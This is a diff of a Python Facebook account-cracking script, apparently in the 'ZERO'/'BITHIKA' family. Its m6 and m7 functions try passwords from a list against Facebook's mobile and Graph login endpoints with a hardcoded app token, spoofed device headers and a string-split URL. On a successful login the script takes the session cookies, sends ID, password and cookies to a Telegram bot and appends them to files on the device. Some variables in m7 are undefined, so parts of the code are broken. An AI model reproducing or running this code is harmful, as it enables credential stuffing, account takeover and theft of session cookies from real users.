@@ -837,52 +837,78 @@ def m5(ids,pwv):
 def m6(ids,pwv):
     global loop,oks,cps
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
-    sys.stdout.write(f"\r{rad}[{green}{animasi}-M6{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
+    sys.stdout.write(f"\r{rad}[{green}{animasi}-M7{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
     sys.stdout.flush()
-    session=requests.Session()
     ua = ua_valid()
     warna = random.choice(my_color)
-    HEAD = HEADERSM1
-    URSS = URLM1
-    DATS = DATAM1
     try:
         for pas in pwv:
-            free_fb = session.get('https://free.facebook.com').text
-            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
+            device_id = str(uuid.uuid4())
+            adid = str(uuid.uuid4())
+            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+            useragent = str(facebook_agent())
+            info= {
+            'adid':adid,
+            'format':'json',
+            'device_id':adid,
+            'email':ids,
+            'password':pas,
+            "logged_out_id": str(uuid.uuid4()),
+            "hash_id": str(uuid.uuid4()),
+            "reg_instance": str(uuid.uuid4()),
+            "session_id": str(uuid.uuid4()),
+            "advertiser_id": str(uuid.uuid4()),
+            'generate_analytics_claims':'1',
+            'credentials_type':'password',
+            'source':'login',
+            "sim_country": "id",
+            "network_country": "id",
+            "relative_url": "method/auth.login",
+            'error_detail_type':'button_with_disabled',
+            'enroll_misauth':'false',
+            'generate_session_cookies':'1',
+            'generate_machine_id':'1',
+            "locale":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
+            "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
+            'fb_api_req_friendly_name':'authenticate',
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
             update={
-            'User-Agent': "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+"Mobile Safari/537.36",
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-User': '?1',
-            'Sec-Fetch-Dest': 'document',
-            'Cache-Control': 'max-age=0',
-            'Referer': 'https://lm.facebook.com/',
-            'DNT': '1',
-            'Pragma': 'no-cache',
-            'TE': 'Trailers', }
-            session.post('https://mobile.facebook.com/login/device-based/login/async/',data=info,headers=update).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = re.findall('c_user=(.*);xs',coki)[0]
+            'Authorization':f'OAuth {accessToken}',
+            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-FB-device-group': str(random.randint(2000, 4000)),
+            "X-FB-Friendly-Name": "ViewerReactionsMutation",
+            "X-FB-Request-Analytics-Tags": "graphservice",
+            'X-FB-Friendly-Name':'authenticate',
+            'X-FB-Connection-Type':'unknown',
+            'X-FB-connection-quality':'EXCELLENT',
+            "X-Tigon-Is-Retry": "False",
+            'User-Agent': '[FBAN/FB4A;FBAV/15.0.0.912;FBBV/3800125;[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
+            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+            'Accept-Encoding':'gzip, deflate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            "X-FB-Client-IP": "True",
+            "X-FB-Server-Cluster": "True",
+            'X-FB-HTTP-Engine': 'Liger'}
+            url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
+            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
+            if 'access_token' in q:
+                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{coki}"
+                cid = str(q['uid'])
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {coki} ")
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{cookie}\33[1;36m");linex()
+                        statusok = (f" {cid} | {pas} | {cookie} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+cookie+'\n')
                         oks.append(cid)
                         break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                coki1 = coki.split("1000")[1]
+            elif 'www.facebook.com' in q['error']['message']:
                 if 'y' in cp_xdx:
                         print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                         open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
@@ -896,6 +922,23 @@ def m6(ids,pwv):
     except Exception as e:
         pass
 
+def useragent():
+    fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
+    enCRACK1 = ['en_GB','en_US']
+    CRACKfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
+    CRACKsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat','null','','']
+    modelxxx =  ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
+    gtt =random.choice(modelxxx)
+    android_version=str(random.randrange(6,13))
+    fbav = str(random.randint(111,111))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))
+    
+    fbbv = str(random.randint(111111111,999999999))
+    
+    lc = random.choice(enCRACK1)
+    cr = random.choice(CRACKsim1)
+    CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
+    return CRACK_ua
+
 def m7(ids,pwv):
     global loop,oks,cps
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
@@ -905,59 +948,79 @@ def m7(ids,pwv):
     warna = random.choice(my_color)
     try:
         for pas in pwv:
-            info= {'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-            'adid': str(uuid.uuid4()),
-            'api_key':'882a8490361da98702bf97a021ddc14d',
-            'client_country_code': 'US',
-            'community_id': '',
-            'cpl': 'true',
-            'credentials_type': 'password',
-            'currently_logged_in_userid': '0',
-            'device_id': str(uuid.uuid4()),
-            'email': ids,
-            'enroll_misauth': 'false',
-            'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation',
-            'fb_api_req_friendly_name': 'authenticate',
-            'format': 'json',
-            'generate_analytics_claim': '1',
-            'generate_machine_id': '1',
-            'generate_session_cookies': '1',
-            'jazoest': '2999',
-            'locale': 'en_US',
-            'meta_inf_fbmeta': 'NO_FILE',
-            'password': pas,
-            'secure_family_device_id': '',
-            'sig': '62f8ce9f74b12f84c123cc23437a4a32',
-            'source': 'login',
-            'try_num': '1'}
+            info={
+            "email": sid,
+            "password": ps,
+            "method": "post",
+            "pretty": "false",
+            "format": "json",
+            "server_timestamps": "true",
+            "locale": "en_US",
+            "purpose": "fetch",
+            "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
+            "fb_api_caller_class": "graphservice",
+            "client_doc_id": str(random.randint(111111111111111111111111111111,999999999999999999999999999999)),
+            "lois_settings": "lois_token",
+            "lara_override": "server_params",
+            "is_from_logged_out": "0",
+            "layered_homepage_experiment_group": "null",
+            "device_id": str(uuid.uuid4()),
+            "waterfall_id": str(uuid.uuid4()),
+            "INTERNAL__latency_qpl_instance_id": "71821365400215",
+            "is_platform_login": "0",
+            "header_transparency_event_location": "login",
+            "INTERNAL__latency_qpl_marker_id": str(random.randint(11111111,99999999)),
+            "family_device_id": str(uuid.uuid4()),
+            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
+            "INTERNAL_INFRA_THEME": "harm_f",
+            "headers_flow_id": str(uuid.uuid4()),
+            "transparency_event_type": "affirmative_action",
+            "header_transparency_event_name": "login_button_clicked",
+            "is_from_logged_in_switcher": "0",
+            "bloks_versioning_id": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
+            "app_id": "com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
+            "scale": "2",
+            "styles_id": "e6c6f61b7a86cdf3fa2eaaffa982fbd1",
+            "using_white_navbar": "True",
+            "pixel_ratio": "2",
+            "is_push_on": "True",
+            "bloks_version": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
+            "fb_api_analytics_tags": '["GraphServices"]',
+            "client_trace_id": str(uuid.uuid4()),
+            "generate_session_cookies": "1",
+            "generate_analytics_claim": "1",
+            "error_detail_type": "button_with_disabled"}
             update={
-            'x-fb-connection-quality': 'EXCELLENT',
-            'x-fb-connection-type': 'WIFI',
-            'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 3 Build/SP1A.210812.016.C2) [FBAN/Orca-Android;FBAV/412.0.0.15.69;FBPN/com.facebook.orca;FBLC/en_US;FBBV/481775700;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FBBK/1;FBLR/0;FB_FW/1;]',
-            'x-tigon-is-retry': 'False',
-            'x-fb-http-engine': 'Liger',
-            'x-fb-client-ip': 'True',
-            'x-fb-server-cluster': 'True',
-            'x-fb-device-group': '7991',
-            'x-fb-sim-hni': '311390',
-            'x-fb-net-hni': '311390',
-            'x-fb-request-analytics-tags': 'unknown',
-            'authorization': 'OAuth null',
-            'content-type': 'application/x-www-form-urlencoded',
-            'x-fb-friendly-name': 'authenticate'}
-            url = 'https://b-graph.facebook.com/auth/login'
-            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
+            "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', 
+            "x-fb-ta-logging-ids": f"graphql:{str(uuid.uuid4())}",
+            "content-type": "application/x-www-form-urlencoded",
+            "x-fb-connection-type": "WIFI",
+            "x-fb-background-state": "1",
+            "x-graphql-request-purpose": "fetch",
+            "user-agent": useragent(),
+            "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
+            "x-graphql-client-library": "graphservice",
+            "x-fb-privacy-context": "3643298472347298",
+            "x-fb-device-group": "3273",
+            "x-tigon-is-retry": "False",
+            "priority": "u=3,i",
+            "accept-encoding": "gzip, deflate",
+            "x-fb-http-engine": "Liger",
+            "x-fb-client-ip": "True",
+            "x-fb-server-cluster": "True"}
+            q = requests.post("https://graph.facebook.com/auth/login",data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
-                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{coki}"
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"{ckkk}"
                 cid = str(q['uid'])
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{cookie}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {cookie} ")
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
+                        statusok = (f" {cid} | {pas} | {coki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+cookie+'\n')
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                         oks.append(cid)
                         break
             elif 'www.facebook.com' in q['error']['message']:
